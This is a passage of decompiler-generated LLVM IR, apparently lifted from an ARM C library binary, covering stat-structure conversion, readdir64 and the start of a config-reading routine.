  %v0_1ecdc = load i32, i32* %r5.global-to-local, align 4
  %v1_1ecdc = add i32 %v0_1ecdc, 80
  %v1_1ece0 = inttoptr i32 %v1_1ecdc to i32*
  store i32 %v2_1ecd4, i32* %v1_1ece0, align 4
  %v3_1ece0 = add i32 %v0_1ecdc, 84
  %v4_1ece0 = inttoptr i32 %v3_1ece0 to i32*
  %v5_1ece0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1ece0, i32* %v4_1ece0, align 4
  %v0_1ece4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1ece4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ece4 = add i32 %v1_1ece4, 48
  %v3_1ece4 = inttoptr i32 %v2_1ece4 to i32*
  store i32 %v0_1ece4, i32* %v3_1ece4, align 4
  %v0_1ece8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1ece8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ece8 = add i32 %v1_1ece8, 52
  %v3_1ece8 = inttoptr i32 %v2_1ece8 to i32*
  store i32 %v0_1ece8, i32* %v3_1ece8, align 4
  %v0_1ecec = load i32, i32* %r2.global-to-local, align 4
  %v1_1ecec = load i32, i32* %r5.global-to-local, align 4
  %v2_1ecec = add i32 %v1_1ecec, 16
  %v3_1ecec = inttoptr i32 %v2_1ecec to i32*
  store i32 %v0_1ecec, i32* %v3_1ecec, align 4
  %v0_1ecf0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ecf0 = add i32 %v0_1ecf0, 88
  store i32 %v1_1ecf0, i32* %r3.global-to-local, align 4
  %v1_1ecf4 = add i32 %v0_1ecf0, 20
  %v2_1ecf4 = inttoptr i32 %v1_1ecf4 to i32*
  %v3_1ecf4 = load i32, i32* %v2_1ecf4, align 4
  store i32 %v3_1ecf4, i32* %r2.global-to-local, align 4
  %v1_1ecf8 = inttoptr i32 %v1_1ecf0 to i32*
  %v2_1ecf8 = load i32, i32* %v1_1ecf8, align 4
  %v3_1ecf8 = add i32 %v0_1ecf0, 92
  %v4_1ecf8 = inttoptr i32 %v3_1ecf8 to i32*
  %v5_1ecf8 = load i32, i32* %v4_1ecf8, align 4
  store i32 %v5_1ecf8, i32* %r1.global-to-local, align 4
  %v1_1ecfc = add i32 %v0_1ecf0, 64
  store i32 %v1_1ecfc, i32* %r6.global-to-local, align 4
  %v1_1ed00 = inttoptr i32 %v1_1ecfc to i32*
  %v2_1ed00 = load i32, i32* %v1_1ed00, align 4
  store i32 %v2_1ed00, i32* %r6.global-to-local, align 4
  %v3_1ed00 = add i32 %v0_1ecf0, 68
  %v4_1ed00 = inttoptr i32 %v3_1ed00 to i32*
  %v5_1ed00 = load i32, i32* %v4_1ed00, align 4
  store i32 %v5_1ed00, i32* %r7.global-to-local, align 4
  %v0_1ed04 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ed04 = add i32 %v0_1ed04, 88
  store i32 %v1_1ed04, i32* %r3.global-to-local, align 4
  %v2_1ed08 = add i32 %v0_1ed04, 20
  %v3_1ed08 = inttoptr i32 %v2_1ed08 to i32*
  store i32 %v3_1ecf4, i32* %v3_1ed08, align 4
  %v0_1ed0c = load i32, i32* %ip.global-to-local, align 4
  %v1_1ed0c = load i32, i32* %r5.global-to-local, align 4
  %v2_1ed0c = add i32 %v1_1ed0c, 24
  %v3_1ed0c = inttoptr i32 %v2_1ed0c to i32*
  store i32 %v0_1ed0c, i32* %v3_1ed0c, align 4
  %v0_1ed10 = load i32, i32* %lr.global-to-local, align 4
  %v1_1ed10 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ed10 = add i32 %v1_1ed10, 28
  %v3_1ed10 = inttoptr i32 %v2_1ed10 to i32*
  store i32 %v0_1ed10, i32* %v3_1ed10, align 4
  %v0_1ed14 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ed14 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ed14 = add i32 %v1_1ed14, 64
  %v3_1ed14 = inttoptr i32 %v2_1ed14 to i32*
  store i32 %v0_1ed14, i32* %v3_1ed14, align 4
  %v0_1ed18 = load i32, i32* %r7.global-to-local, align 4
  %v1_1ed18 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ed18 = add i32 %v1_1ed18, 68
  %v3_1ed18 = inttoptr i32 %v2_1ed18 to i32*
  store i32 %v0_1ed18, i32* %v3_1ed18, align 4
  %v0_1ed1c = load i32, i32* %r3.global-to-local, align 4
  %v1_1ed1c = inttoptr i32 %v0_1ed1c to i32*
  store i32 %v2_1ecf8, i32* %v1_1ed1c, align 4
  %v3_1ed1c = add i32 %v0_1ed1c, 4
  %v4_1ed1c = inttoptr i32 %v3_1ed1c to i32*
  %v5_1ed1c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1ed1c, i32* %v4_1ed1c, align 4
  %v2_1ed20 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1ed20, i32* %r4.global-to-local, align 4
  ret i32 %v2_1ecf8

; uselistorder directives
  uselistorder i32 %v0_1ecf0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1ecc8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1ed28 = load i32, i32* @r4, align 4
  store i32 %v3_1ed28, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_1ed40 = inttoptr i32 %arg2 to i8*
  %v4_1ed40 = call i32 @__GI_memset(i8* %v3_1ed40, i32 0, i32 88)
  %v2_1ed44 = load i32, i32* %arg1, align 4
  %v3_1ed44 = add i32 %tmp, 4
  %v4_1ed44 = inttoptr i32 %v3_1ed44 to i32*
  %v5_1ed44 = load i32, i32* %v4_1ed44, align 4
  store i32 %v5_1ed44, i32* %r4.global-to-local, align 4
  %v0_1ed48 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ed48 = inttoptr i32 %v0_1ed48 to i32*
  store i32 %v2_1ed44, i32* %v1_1ed48, align 4
  %v3_1ed48 = add i32 %v0_1ed48, 4
  %v4_1ed48 = inttoptr i32 %v3_1ed48 to i32*
  %v5_1ed48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1ed48, i32* %v4_1ed48, align 4
  %v0_1ed4c = load i32, i32* %r5.global-to-local, align 4
  %v1_1ed4c = add i32 %v0_1ed4c, 32
  %v1_1ed50 = inttoptr i32 %v1_1ed4c to i32*
  %v2_1ed50 = load i32, i32* %v1_1ed50, align 4
  %v3_1ed50 = add i32 %v0_1ed4c, 36
  %v4_1ed50 = inttoptr i32 %v3_1ed50 to i32*
  %v5_1ed50 = load i32, i32* %v4_1ed50, align 4
  store i32 %v5_1ed50, i32* %r4.global-to-local, align 4
  %v1_1ed54 = add i32 %v0_1ed4c, 96
  %v2_1ed54 = inttoptr i32 %v1_1ed54 to i32*
  %v3_1ed54 = load i32, i32* %v2_1ed54, align 4
  store i32 %v3_1ed54, i32* %r2.global-to-local, align 4
  %v1_1ed58 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ed58 = add i32 %v1_1ed58, 32
  %v3_1ed58 = inttoptr i32 %v2_1ed58 to i32*
  store i32 %v2_1ed50, i32* %v3_1ed58, align 4
  %v0_1ed5c = load i32, i32* %r4.global-to-local, align 4
  %v1_1ed5c = load i32, i32* %r6.global-to-local, align 4
  %v2_1ed5c = add i32 %v1_1ed5c, 36
  %v3_1ed5c = inttoptr i32 %v2_1ed5c to i32*
  store i32 %v0_1ed5c, i32* %v3_1ed5c, align 4
  %v0_1ed60 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ed60 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ed60 = add i32 %v1_1ed60, 12
  %v3_1ed60 = inttoptr i32 %v2_1ed60 to i32*
  store i32 %v0_1ed60, i32* %v3_1ed60, align 4
  %v0_1ed64 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ed64 = add i32 %v0_1ed64, 48
  %v2_1ed64 = inttoptr i32 %v1_1ed64 to i32*
  %v3_1ed64 = load i32, i32* %v2_1ed64, align 4
  %v1_1ed68 = add i32 %v0_1ed64, 24
  store i32 %v1_1ed68, i32* %ip.global-to-local, align 4
  %v1_1ed6c = inttoptr i32 %v1_1ed68 to i32*
  %v2_1ed6c = load i32, i32* %v1_1ed6c, align 4
  store i32 %v2_1ed6c, i32* %ip.global-to-local, align 4
  %v3_1ed6c = add i32 %v0_1ed64, 28
  %v4_1ed6c = inttoptr i32 %v3_1ed6c to i32*
  %v5_1ed6c = load i32, i32* %v4_1ed6c, align 4
  store i32 %v5_1ed6c, i32* %lr.global-to-local, align 4
  %v1_1ed70 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ed70 = add i32 %v1_1ed70, 44
  %v3_1ed70 = inttoptr i32 %v2_1ed70 to i32*
  store i32 %v3_1ed64, i32* %v3_1ed70, align 4
  %v0_1ed74 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ed74 = add i32 %v0_1ed74, 64
  %v2_1ed74 = inttoptr i32 %v1_1ed74 to i32*
  %v3_1ed74 = load i32, i32* %v2_1ed74, align 4
  %v1_1ed78 = add i32 %v0_1ed74, 56
  %v2_1ed78 = inttoptr i32 %v1_1ed78 to i32*
  %v3_1ed78 = load i32, i32* %v2_1ed78, align 4
  store i32 %v3_1ed78, i32* %r2.global-to-local, align 4
  %v1_1ed7c = load i32, i32* %r6.global-to-local, align 4
  %v2_1ed7c = add i32 %v1_1ed7c, 52
  %v3_1ed7c = inttoptr i32 %v2_1ed7c to i32*
  store i32 %v3_1ed74, i32* %v3_1ed7c, align 4
  %v0_1ed80 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ed80 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ed80 = add i32 %v1_1ed80, 48
  %v3_1ed80 = inttoptr i32 %v2_1ed80 to i32*
  store i32 %v0_1ed80, i32* %v3_1ed80, align 4
  %v0_1ed84 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ed84 = add i32 %v0_1ed84, 72
  %v1_1ed88 = inttoptr i32 %v1_1ed84 to i32*
  %v2_1ed88 = load i32, i32* %v1_1ed88, align 4
  %v3_1ed88 = add i32 %v0_1ed84, 76
  %v4_1ed88 = inttoptr i32 %v3_1ed88 to i32*
  %v5_1ed88 = load i32, i32* %v4_1ed88, align 4
  store i32 %v5_1ed88, i32* %r1.global-to-local, align 4
  %v0_1ed8c = load i32, i32* %r6.global-to-local, align 4
  %v1_1ed8c = add i32 %v0_1ed8c, 56
  %v1_1ed90 = inttoptr i32 %v1_1ed8c to i32*
  store i32 %v2_1ed88, i32* %v1_1ed90, align 4
  %v3_1ed90 = add i32 %v0_1ed8c, 60
  %v4_1ed90 = inttoptr i32 %v3_1ed90 to i32*
  %v5_1ed90 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1ed90, i32* %v4_1ed90, align 4
  %v0_1ed94 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ed94 = add i32 %v0_1ed94, 80
  %v1_1ed98 = inttoptr i32 %v1_1ed94 to i32*
  %v2_1ed98 = load i32, i32* %v1_1ed98, align 4
  %v3_1ed98 = add i32 %v0_1ed94, 84
  %v4_1ed98 = inttoptr i32 %v3_1ed98 to i32*
  %v5_1ed98 = load i32, i32* %v4_1ed98, align 4
  store i32 %v5_1ed98, i32* %r1.global-to-local, align 4
  %v0_1ed9c = load i32, i32* %r6.global-to-local, align 4
  %v1_1ed9c = add i32 %v0_1ed9c, 64
  %v1_1eda0 = inttoptr i32 %v1_1ed9c to i32*
  store i32 %v2_1ed98, i32* %v1_1eda0, align 4
  %v3_1eda0 = add i32 %v0_1ed9c, 68
  %v4_1eda0 = inttoptr i32 %v3_1eda0 to i32*
  %v5_1eda0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1eda0, i32* %v4_1eda0, align 4
  %v0_1eda4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1eda4 = add i32 %v0_1eda4, 16
  %v2_1eda4 = inttoptr i32 %v1_1eda4 to i32*
  %v3_1eda4 = load i32, i32* %v2_1eda4, align 4
  %v1_1eda8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1eda8 = add i32 %v1_1eda8, 16
  %v3_1eda8 = inttoptr i32 %v2_1eda8 to i32*
  store i32 %v3_1eda4, i32* %v3_1eda8, align 4
  %v0_1edac = load i32, i32* %r5.global-to-local, align 4
  %v1_1edac = add i32 %v0_1edac, 88
  %v1_1edb0 = add i32 %v0_1edac, 20
  %v2_1edb0 = inttoptr i32 %v1_1edb0 to i32*
  %v3_1edb0 = load i32, i32* %v2_1edb0, align 4
  store i32 %v3_1edb0, i32* %r2.global-to-local, align 4
  %v1_1edb4 = inttoptr i32 %v1_1edac to i32*
  %v2_1edb4 = load i32, i32* %v1_1edb4, align 4
  %v3_1edb4 = add i32 %v0_1edac, 92
  %v4_1edb4 = inttoptr i32 %v3_1edb4 to i32*
  %v5_1edb4 = load i32, i32* %v4_1edb4, align 4
  store i32 %v5_1edb4, i32* %r1.global-to-local, align 4
  %v0_1edb8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1edb8 = add i32 %v0_1edb8, 72
  %v1_1edbc = inttoptr i32 %v1_1edb8 to i32*
  store i32 %v2_1edb4, i32* %v1_1edbc, align 4
  %v3_1edbc = add i32 %v0_1edb8, 76
  %v4_1edbc = inttoptr i32 %v3_1edbc to i32*
  %v5_1edbc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1edbc, i32* %v4_1edbc, align 4
  %v0_1edc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1edc0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1edc0 = add i32 %v1_1edc0, 20
  %v3_1edc0 = inttoptr i32 %v2_1edc0 to i32*
  store i32 %v0_1edc0, i32* %v3_1edc0, align 4
  %v0_1edc4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1edc4 = load i32, i32* %r6.global-to-local, align 4
  %v2_1edc4 = add i32 %v1_1edc4, 24
  %v3_1edc4 = inttoptr i32 %v2_1edc4 to i32*
  store i32 %v0_1edc4, i32* %v3_1edc4, align 4
  %v0_1edc8 = load i32, i32* %lr.global-to-local, align 4
  %v1_1edc8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1edc8 = add i32 %v1_1edc8, 28
  %v3_1edc8 = inttoptr i32 %v2_1edc8 to i32*
  store i32 %v0_1edc8, i32* %v3_1edc8, align 4
  %v2_1edcc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1edcc, i32* %r4.global-to-local, align 4
  ret i32 %v2_1edb4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 5, 3, 4, 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r6, align 4
  %v1_1ede8 = add i32 %tmp, 24
  store i32 %v1_1ede8, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_1ee00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 112) to i32*), align 4
  store i32 %v4_1ee00, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1ee00)
  %v0_1ee14 = load i32, i32* @r6, align 4
  %v2_1ee14 = add i32 %v0_1ee14, 16
  %v3_1ee14 = inttoptr i32 %v2_1ee14 to i32*
  %v4_1ee14 = load i32, i32* %v3_1ee14, align 4
  store i32 %v4_1ee14, i32* %ip.global-to-local, align 4
  store i32 126496, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1ee14)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1ee24

dec_label_pc_1ee24:                               ; preds = %dec_label_pc_1ee54, %entry
  %v0_1ee24 = load i32, i32* @r5, align 4
  %v1_1ee24 = add i32 %v0_1ee24, 4
  %v2_1ee24 = inttoptr i32 %v1_1ee24 to i32*
  %v3_1ee24 = load i32, i32* %v2_1ee24, align 4
  %v4_1ee24 = add i32 %v0_1ee24, 8
  %v5_1ee24 = inttoptr i32 %v4_1ee24 to i32*
  %v6_1ee24 = load i32, i32* %v5_1ee24, align 4
  %tmp10 = icmp ugt i32 %v6_1ee24, %v3_1ee24
  br i1 %tmp10, label %dec_label_pc_1ee54, label %dec_label_pc_1ee30

dec_label_pc_1ee30:                               ; preds = %dec_label_pc_1ee24
  %v1_1ee30 = inttoptr i32 %v0_1ee24 to i32*
  %v2_1ee30 = load i32, i32* %v1_1ee30, align 4
  %v1_1ee34 = add i32 %v0_1ee24, 12
  %v2_1ee34 = inttoptr i32 %v1_1ee34 to i32*
  %v3_1ee34 = load i32, i32* %v2_1ee34, align 4
  %v1_1ee38 = add i32 %v0_1ee24, 20
  %v2_1ee38 = inttoptr i32 %v1_1ee38 to i32*
  %v3_1ee38 = load i32, i32* %v2_1ee38, align 4
  %v4_1ee3c = inttoptr i32 %v3_1ee34 to i32*
  %v5_1ee3c = call i32 @__getdents64(i32 %v2_1ee30, i32* %v4_1ee3c, i32 %v3_1ee38, i32 %v6_1ee24)
  %tmp9 = icmp slt i32 %v5_1ee3c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_1ee4c

.thread:                                          ; preds = %dec_label_pc_1ee30
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1ee84

dec_label_pc_1ee4c:                               ; preds = %dec_label_pc_1ee30
  %v1_1ee4c = load i32, i32* @r5, align 4
  %v2_1ee4c = add i32 %v1_1ee4c, 8
  %v3_1ee4c = inttoptr i32 %v2_1ee4c to i32*
  store i32 %v5_1ee3c, i32* %v3_1ee4c, align 4
  %v0_1ee50 = load i32, i32* @r7, align 4
  %v1_1ee50 = load i32, i32* @r5, align 4
  %v2_1ee50 = add i32 %v1_1ee50, 4
  %v3_1ee50 = inttoptr i32 %v2_1ee50 to i32*
  store i32 %v0_1ee50, i32* %v3_1ee50, align 4
  %v0_1ee54.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ee54

dec_label_pc_1ee54:                               ; preds = %dec_label_pc_1ee24, %dec_label_pc_1ee4c
  %v1_1ee78 = phi i32 [ %v0_1ee24, %dec_label_pc_1ee24 ], [ %v0_1ee54.pre, %dec_label_pc_1ee4c ]
  %v1_1ee54 = add i32 %v1_1ee78, 4
  %v2_1ee54 = inttoptr i32 %v1_1ee54 to i32*
  %v3_1ee54 = load i32, i32* %v2_1ee54, align 4
  %v1_1ee58 = add i32 %v1_1ee78, 12
  %v2_1ee58 = inttoptr i32 %v1_1ee58 to i32*
  %v3_1ee58 = load i32, i32* %v2_1ee58, align 4
  %v2_1ee5c = add i32 %v3_1ee58, %v3_1ee54
  store i32 %v2_1ee5c, i32* @r4, align 4
  %v3_1ee60 = inttoptr i32 %v2_1ee5c to i32*
  %v4_1ee60 = load i32, i32* %v3_1ee60, align 4
  %v1_1ee64 = add i32 %v2_1ee5c, 4
  %v2_1ee64 = inttoptr i32 %v1_1ee64 to i32*
  %v3_1ee64 = load i32, i32* %v2_1ee64, align 4
  %v1_1ee68 = add i32 %v2_1ee5c, 16
  %v2_1ee68 = inttoptr i32 %v1_1ee68 to i16*
  %v3_1ee68 = load i16, i16* %v2_1ee68, align 2
  %v4_1ee68 = zext i16 %v3_1ee68 to i32
  %v1_1ee6c = add i32 %v2_1ee5c, 8
  %v2_1ee6c = inttoptr i32 %v1_1ee6c to i32*
  %v3_1ee6c = load i32, i32* %v2_1ee6c, align 4
  store i32 %v3_1ee6c, i32* %ip.global-to-local, align 4
  %v2_1ee70 = add i32 %v4_1ee68, %v3_1ee54
  %v2_1ee74 = or i32 %v3_1ee64, %v4_1ee60
  %v4_1ee74 = icmp eq i32 %v2_1ee74, 0
  store i32 %v2_1ee70, i32* %v2_1ee54, align 4
  %v0_1ee7c = load i32, i32* %ip.global-to-local, align 4
  %v1_1ee7c = load i32, i32* @r5, align 4
  %v2_1ee7c = add i32 %v1_1ee7c, 16
  %v3_1ee7c = inttoptr i32 %v2_1ee7c to i32*
  store i32 %v0_1ee7c, i32* %v3_1ee7c, align 4
  br i1 %v4_1ee74, label %dec_label_pc_1ee24, label %dec_label_pc_1ee84

dec_label_pc_1ee84:                               ; preds = %dec_label_pc_1ee54, %.thread
  %v0_1ee90 = load i32, i32* @r6, align 4
  %v2_1ee90 = add i32 %v0_1ee90, 44
  %v3_1ee90 = inttoptr i32 %v2_1ee90 to i32*
  %v4_1ee90 = load i32, i32* %v3_1ee90, align 4
  store i32 %v4_1ee90, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1ee90)
  %v0_1ee9c = load i32, i32* @r4, align 4
  ret i32 %v0_1ee9c

; uselistorder directives
  uselistorder i32 %v2_1ee5c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_1ee78, { 1, 0 }
  uselistorder i32 %v6_1ee24, { 1, 0 }
  uselistorder i32 %v0_1ee24, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_1ee54, { 1, 0 }
}

define i32 @function_1eeb0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1eeb0:
  %v0_1eeb0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1eeb0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1eeb0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1eeb0, %bb
  %v4_1eebc = phi i32 [ %arg1, %dec_label_pc_1eeb0 ], [ 0, %bb ]
  ret i32 %v4_1eebc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1eec0 = load i32, i32* @r4, align 4
  %v6_1eec0 = load i32, i32* @r5, align 4
  %v9_1eec0 = load i32, i32* @r6, align 4
  %v12_1eec0 = load i32, i32* @r7, align 4
  %v15_1eec0 = load i32, i32* @r8, align 4
  %v18_1eec0 = load i32, i32* @sb, align 4
  %v21_1eec0 = load i32, i32* @sl, align 4
  %v24_1eec0 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1eec4 = icmp eq i32* %arg1, null
  store i1 %v2_1eec4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_1eec4, label %dec_label_pc_1f1d4, label %dec_label_pc_1eedc

dec_label_pc_1eedc:                               ; preds = %entry
  %v1_1eedc = urem i32 %arg3, 256
  store i32 %v1_1eedc, i32* @sb, align 4
  %v1_1eee0 = udiv i32 %arg3, 256
  %v3_1eee4 = urem i32 %v1_1eee0, 256
  %v3_1eee8 = mul nuw nsw i32 %v1_1eedc, 4
  %v1_1eef0 = or i32 %v3_1eee8, 1
  %v1_1eefc = and i32 %arg3, 131072
  %v1_1ef00 = add nsw i32 %v1_1eedc, -1
  %v1_1ef0c = and i32 %arg3, 262144
  store i32 %v1_1ef0c, i32* %r2.global-to-local, align 4
  %v1_1ef10 = and i32 %arg3, 65536
  store i32 %v1_1ef10, i32* %r3.global-to-local, align 4
  store i32 %v1_1ef10, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_1ef20 = add i32 %arg4, 1
  store i32 %v1_1ef20, i32* @sl, align 4
  %v2_1f098 = icmp eq i32 %v1_1eefc, 0
  %v1_1f0f0 = inttoptr i32 %arg2 to i32*
  %v2_1f108 = icmp eq i32 %v1_1ef0c, 0
  br label %dec_label_pc_1ef24

dec_label_pc_1ef24:                               ; preds = %dec_label_pc_1ef24.backedge, %dec_label_pc_1eedc
  %v2_1ef40 = phi i32 [ %v0_1ef24.pre, %dec_label_pc_1ef24.backedge ], [ %tmp, %dec_label_pc_1eedc ]
  %v1_1ef24 = add i32 %v2_1ef40, 4
  %v2_1ef24 = inttoptr i32 %v1_1ef24 to i32*
  %v3_1ef24 = load i32, i32* %v2_1ef24, align 4
  store i32 %v3_1ef24, i32* %r3.global-to-local, align 4
  %v2_1ef28 = icmp eq i32 %v3_1ef24, 0
  store i1 %v2_1ef28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ef28, label %dec_label_pc_1ef30, label %dec_label_pc_1ef78

dec_label_pc_1ef30:                               ; preds = %dec_label_pc_1ef24
  %v1_1ef30 = add i32 %v2_1ef40, 16
  %v2_1ef30 = inttoptr i32 %v1_1ef30 to i32*
  %v3_1ef30 = load i32, i32* %v2_1ef30, align 4
  store i32 %v3_1ef30, i32* %r3.global-to-local, align 4
  %v2_1ef34 = icmp eq i32 %v3_1ef30, 0
  store i1 %v2_1ef34, i1* %cpsr_z.global-to-local, align 1
  %v1_1ef38 = add i32 %v2_1ef40, 8
  %v2_1ef38 = inttoptr i32 %v1_1ef38 to i32*
  %v3_1ef38 = load i32, i32* %v2_1ef38, align 4
  store i32 %v3_1ef38, i32* %r3.global-to-local, align 4
  br i1 %v2_1ef34, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_1ef30
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_1ef30, align 4
  %v0_1ef44.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_1ef30, %bb
  %v0_1ef44 = phi i32 [ %v0_1ef44.pre, %bb ], [ %v3_1ef38, %dec_label_pc_1ef30 ]
  %v2_1ef44 = icmp eq i32 %v0_1ef44, 0
  store i1 %v2_1ef44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ef44, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_1eef0, i32* %r3.global-to-local, align 4
  %v2_1ef4c = load i32, i32* @r5, align 4
  %v3_1ef4c = add i32 %v2_1ef4c, 8
  %v4_1ef4c = inttoptr i32 %v3_1ef4c to i32*
  store i32 %v1_1eef0, i32* %v4_1ef4c, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_1ef50 = load i32, i32* @r5, align 4
  %v1_1ef50 = add i32 %v0_1ef50, 16
  %v2_1ef50 = inttoptr i32 %v1_1ef50 to i32*
  %v3_1ef50 = load i32, i32* %v2_1ef50, align 4
  store i32 %v3_1ef50, i32* %r0.global-to-local, align 4
  %v1_1ef54 = add i32 %v0_1ef50, 8
  %v2_1ef54 = inttoptr i32 %v1_1ef54 to i32*
  %v3_1ef54 = load i32, i32* %v2_1ef54, align 4
  store i32 %v3_1ef54, i32* %r3.global-to-local, align 4
  %v2_1ef58 = add i32 %v3_1ef54, %v3_1ef50
  store i32 %v2_1ef58, i32* %r0.global-to-local, align 4
  %v1_1ef5c = call i32 @malloc(i32 %v2_1ef58)
  store i32 %v1_1ef5c, i32* %r0.global-to-local, align 4
  %v2_1ef60 = icmp eq i32 %v1_1ef5c, 0
  store i1 %v2_1ef60, i1* %cpsr_z.global-to-local, align 1
  %v1_1ef64 = load i32, i32* @r5, align 4
  %v2_1ef64 = add i32 %v1_1ef64, 4
  %v3_1ef64 = inttoptr i32 %v2_1ef64 to i32*
  store i32 %v1_1ef5c, i32* %v3_1ef64, align 4
  br i1 %v2_1ef60, label %dec_label_pc_1f1d4, label %dec_label_pc_1ef6c

dec_label_pc_1ef6c:                               ; preds = %.thread
  %v0_1ef6c = load i32, i32* @r5, align 4
  %v1_1ef6c = add i32 %v0_1ef6c, 20
  %v2_1ef6c = inttoptr i32 %v1_1ef6c to i32*
  %v3_1ef6c = load i32, i32* %v2_1ef6c, align 4
  %v1_1ef70 = or i32 %v3_1ef6c, 1
  store i32 %v1_1ef70, i32* %r3.global-to-local, align 4
  store i32 %v1_1ef70, i32* %v2_1ef6c, align 4
  %v0_1ef78.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ef78

